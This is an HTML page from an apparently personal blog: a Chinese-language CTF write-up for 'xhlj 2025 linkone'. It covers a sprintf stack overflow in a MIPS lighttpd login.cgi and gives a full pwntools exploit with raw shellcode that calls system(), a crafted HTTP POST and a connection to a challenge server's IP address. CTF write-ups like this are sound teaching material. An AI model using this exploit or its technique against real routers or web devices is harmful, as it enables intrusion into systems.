@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>xhlj 2025 linkone</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./xhlj 2025 linkone.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">xhlj 2025 linkone</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-01-18]</div>
+    </header>
+    <div class="layout-grid">
+                <main><p>lighttpd
+login.cgi Goto_chidx功能 <code>sprintf</code>栈溢出</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> __fastcall </span><span style="color:#8fa1b3;">Goto_chidx</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">a1</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*v2; </span><span style="color:#65737e;">// $v0
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> v3; </span><span style="color:#65737e;">// $s2
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*v4; </span><span style="color:#65737e;">// $v0
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*v5; </span><span style="color:#65737e;">// $s1
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*v6; </span><span style="color:#65737e;">// $s0
+</span><span style="color:#c0c5ce;">  FILE *v8; </span><span style="color:#65737e;">// $s0
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> v9[</span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">]; </span><span style="color:#65737e;">// [sp+20h] [-80h] BYREF
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">  v2 = </span><span style="color:#8fa1b3;">web_get</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">wlanIdxNum</span><span style="color:#c0c5ce;">&quot;, a1, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  v3 = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  v5 = </span><span style="color:#8fa1b3;">strdup</span><span style="color:#c0c5ce;">(v2);
+</span><span style="color:#c0c5ce;">  v4 = </span><span style="color:#8fa1b3;">web_get</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">wlanUrl</span><span style="color:#c0c5ce;">&quot;, a1, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  v6 = </span><span style="color:#8fa1b3;">strdup</span><span style="color:#c0c5ce;">(v4);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( v5 )
+</span><span style="color:#c0c5ce;">    v3 = </span><span style="color:#96b5b4;">atoi</span><span style="color:#c0c5ce;">(v5);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">sprintf</span><span style="color:#c0c5ce;">(v9, &quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">?wlanidx=</span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, v6, v3);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( </span><span style="color:#8fa1b3;">access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/tmp/web_log</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) )
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">web_redirect</span><span style="color:#c0c5ce;">(v9);
+</span><span style="color:#c0c5ce;">  v8 = </span><span style="color:#96b5b4;">fopen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/console</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">w+</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">( !v8 )
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">web_redirect</span><span style="color:#c0c5ce;">(v9);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(v8, &quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">login.c</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">Goto_chidx</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">544</span><span style="color:#c0c5ce;">, v9);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">fclose</span><span style="color:#c0c5ce;">(v8);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#8fa1b3;">web_redirect</span><span style="color:#c0c5ce;">(v9);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>架构32位mipsel（小端）
+qemu system起环境，堆栈可执行、无canary、地址偏移不变，payload中不能有0x00
+直接栈溢出跳栈shellcode，shellcode布置第一个参数<code>$a0</code>跳转libc中system函数，执行<code>cat /flag &gt;&gt; /etc_ro/lighttpd/www/login.shtml;</code>将flag写到登录页</p>
+<h2 id="diao-shi">调试</h2><p>启动脚本加一个端口用来调试
+<code>-net user</code>  用户模式网络 提供NAT网络环境
+<code>-net nic</code> 创建一个虚拟网卡（NIC, Network Interface Card），为虚拟机提供网络接口
+<code>-net user,hostfwd=tcp::2222-:22 -net nic</code> 将宿主机的 TCP 端口 <code>2222</code> 转发到虚拟机的 <code>22</code>（SSH）端口，宿主机可直接访问localhost:2222访问到虚拟机22端口</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">while true; do
+</span><span style="color:#c0c5ce;">    ./gdbserver :1337 --attach `pidof login.cgi`
+</span><span style="color:#c0c5ce;">done
+</span></pre>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import</span><span style="color:#d08770;">*
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">context.log_level=&#39;</span><span style="color:#a3be8c;">debug</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#65737e;"># r = remote(&quot;127.0.0.1&quot;, 8888)
+</span><span style="color:#c0c5ce;">r = </span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">139.155.126.78</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">21727</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">li $a0,0x7fff6508
+</span><span style="color:#65737e;">li $t9,0x77dc3d80
+</span><span style="color:#65737e;">jalr $t9
+</span><span style="color:#65737e;">addiu $a1, 0x1122
+</span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">buf = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\xff\x7f\x04</span><span style="color:#a3be8c;">&lt;</span><span style="color:#96b5b4;">\x08</span><span style="color:#a3be8c;">e</span><span style="color:#96b5b4;">\x84</span><span style="color:#a3be8c;">4</span><span style="color:#96b5b4;">\xdc</span><span style="color:#a3be8c;">w</span><span style="color:#96b5b4;">\x19</span><span style="color:#a3be8c;">&lt;</span><span style="color:#96b5b4;">\x80</span><span style="color:#a3be8c;">=97</span><span style="color:#96b5b4;">\t\xf8 \x03</span><span style="color:#a3be8c;">&quot;</span><span style="color:#96b5b4;">\x11\xa5</span><span style="color:#a3be8c;">$</span><span style="color:#c0c5ce;">&#39;
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">hex</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(buf)))
+</span><span style="color:#c0c5ce;">sc = buf
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">cmd = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">cat /flag &gt;&gt; /etc_ro/lighttpd/www/login.shtml;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">payload = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">0x80</span><span style="color:#c0c5ce;">+</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">BBBBCCCCDDDD</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#8fa1b3;">p32</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x7fff64f0</span><span style="color:#c0c5ce;">)+sc+cmd
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">_packet = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&#39;&#39;&#39;</span><span style="color:#a3be8c;">POST /cgi-bin/login.cgi HTTP/1.1</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Host: 127.0.0.1:8888</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Cache-Control: max-age=0</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Origin: http://127.0.0.1:8888</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Content-Type: application/x-www-form-urlencoded</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Upgrade-Insecure-Requests: 1</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Referer: http://127.0.0.1:8888/</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Accept-Encoding: gzip, deflate</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Connection: close</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">Content-Length: </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">page=Goto_chidx&amp;wlanIdxNum=1&amp;wlanUrl=</span><span style="color:#c0c5ce;">&quot;)+</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(payload)}</span><span style="color:#96b5b4;">\r
+</span><span style="color:#96b5b4;">\r
+</span><span style="color:#a3be8c;">page=Goto_chidx&amp;wlanIdxNum=1&amp;wlanUrl=</span><span style="color:#c0c5ce;">&#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">_packet= _packet.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()+payload+</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\r</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#65737e;">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+</span><span style="color:#65737e;">     Start        End Perm     Size Offset File
+</span><span style="color:#65737e;">  0x400000   0x409000 r-xp     9000      0 /root/cpio-root/etc_ro/lighttpd/www/cgi-bin/login.cgi
+</span><span style="color:#65737e;">  0x448000   0x452000 rw-p     a000   8000 /root/cpio-root/etc_ro/lighttpd/www/cgi-bin/login.cgi
+</span><span style="color:#65737e;">  0x452000   0x458000 rwxp     6000      0 [heap]
+</span><span style="color:#65737e;">0x77d7c000 0x77dd8000 r-xp    5c000      0 /root/cpio-root/lib/libuClibc-0.9.28.so
+</span><span style="color:#65737e;">0x77dd8000 0x77e17000 ---p    3f000      0 [anon_77dd8]
+</span><span style="color:#65737e;">0x77e17000 0x77e18000 r--p     1000  5b000 /root/cpio-root/lib/libuClibc-0.9.28.so
+</span><span style="color:#65737e;">0x77e18000 0x77e19000 rw-p     1000  5c000 /root/cpio-root/lib/libuClibc-0.9.28.so
+</span><span style="color:#65737e;">0x77e19000 0x77e1e000 rw-p     5000      0 [anon_77e19]
+</span><span style="color:#65737e;">0x77e1e000 0x77e2a000 r-xp     c000      0 /root/cpio-root/lib/libwebutil.so
+</span><span style="color:#65737e;">0x77e2a000 0x77e69000 ---p    3f000      0 [anon_77e2a]
+</span><span style="color:#65737e;">0x77e69000 0x77e74000 rw-p     b000   b000 /root/cpio-root/lib/libwebutil.so
+</span><span style="color:#65737e;">0x77e74000 0x77fb1000 rw-p   13d000      0 [anon_77e74]
+</span><span style="color:#65737e;">0x77fb1000 0x77fb7000 r-xp     6000      0 /root/cpio-root/lib/ld-uClibc-0.9.28.so
+</span><span style="color:#65737e;">0x77ff5000 0x77ff6000 rw-p     1000      0 [anon_77ff5]
+</span><span style="color:#65737e;">0x77ff6000 0x77ff7000 r--p     1000   5000 /root/cpio-root/lib/ld-uClibc-0.9.28.so
+</span><span style="color:#65737e;">0x77ff7000 0x77ff8000 rw-p     1000   6000 /root/cpio-root/lib/ld-uClibc-0.9.28.so
+</span><span style="color:#65737e;">0x7ffd6000 0x7fff7000 rwxp    21000      0 [stack]
+</span><span style="color:#65737e;">0x7fff7000 0x7fff8000 r-xp     1000      0 [vdso]
+</span><span style="color:#65737e;">&#39;&#39;&#39;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(_packet)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">interactive</span><span style="color:#c0c5ce;">()
+</span></pre>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#diao-shi">调试</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
